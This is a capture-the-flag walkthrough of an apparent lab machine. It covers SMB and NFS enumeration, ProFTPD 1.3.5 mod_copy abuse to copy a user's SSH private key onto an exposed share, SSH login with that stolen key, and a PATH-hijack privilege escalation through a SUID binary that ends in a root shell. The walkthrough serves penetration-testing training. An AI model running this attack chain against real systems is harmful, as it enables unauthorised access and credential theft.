# NMAP
```
mkdir nmap
nmap -sC -sV -oN nmap/initial $IP
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $IP
```

# SAMBA
Samba is the standard Windows interoperability suite of programs for Linux and
Unix. It allows end users to access and use files, printers and other commonly
shared resources on a companies intranet or internet. Its often referred to as a
network file system.

Samba is based on the common client/server protocol of Server Message Block
(SMB). SMB is developed only for Windows, without Samba, other computer
platforms would be isolated from Windows machines, even if they were part of the
same network.

Using nmap we can enumerate a machine for SMB shares.

Nmap has the ability to run to automate a wide variety of networking tasks.
There is a script to enumerate shares!

```
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.235.32
```

SMB has two ports, 445 and 139.

On most distributions of Linux smbclient is already installed. Lets inspect one
of the shares.

```
$ smbclient //$IP/anonymous
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\vagrant's password:
Try "help" to get a list of possible commands.
smb: \> ls
.                                   D        0  Wed Sep  4 10:49:09 2019
..                                  D        0  Wed Sep  4 10:56:07 2019
log.txt                             N    12237  Wed Sep  4 10:49:09 2019

9204224 blocks of size 1024. 6877112 blocks available
smb: \>
```

Recursively download things from SAMBA share:
```
smbget -R smb://$IP/anonymous
```

Your earlier nmap port scan will have shown port 111 running the service
rpcbind. This is just an server that converts remote procedure call (RPC)
program number into universal addresses. When an RPC service is started, it
tells rpcbind the address at which it is listening and the RPC program number
its prepared to serve.

In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.

```
$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $IP

Starting Nmap 7.60 ( https://nmap.org ) at 2020-12-08 23:12 UTC
Nmap scan report for 10.10.235.32
Host is up (0.31s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount:
|_  /var *

Nmap done: 1 IP address (1 host up) scanned in 2.81 seconds
```
## ProFTP
ProFtpd is a free and open-source FTP server, compatible with Unix and Windows
systems. Its also been vulnerable in the past software versions.

Let's check the version:
```
$ ftp $IP 21
Connected to 10.10.235.32.
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.235.32]
Name (10.10.235.32:vagrant):
```
### searchsploit
Searchsploit is basically just a command line search tool for exploit-db.com.
```
$ searchsploit proftpd 1.3.5
------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                     |  Path
 ------------------------------------------------------------------- ---------------------------------
 ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)          | linux/remote/37262.rb
 ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                | linux/remote/36803.py
 ProFTPd 1.3.5 - File Copy                                          | linux/remote/36742.txt
 ------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
```

The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be
used to copy files/directories from one place to another on the server. Any
unauthenticated client can leverage these commands to copy files from any part
of the filesystem to a chosen destination.

We know that the FTP service is running as the Kenobi user (from the file on the
share) and an ssh key is generated for that user.
```
$ nc $IP 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.235.32]

500 Invalid command: try being more creative
ls
500 LS not understood
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

After copying over the file, we mount our nfs drive:
```
mkdir /mnt/kenobiNFS
mount machine_ip:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
cp tmp/id_rsa .
sudo chmod 600 id_rsa
ssd -i id_rsa kenobi@$IP
```

Next we find our SUID binary:
```
find / -perm -u=s -type f 2>/dev/null
```

We find that `/usr/bin/menu` works and makes local calls to the following:
```
curl
uname
ifconfig
```

Perfect, lets create a local binary for that:
```
cd /tmp
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
1
#
```
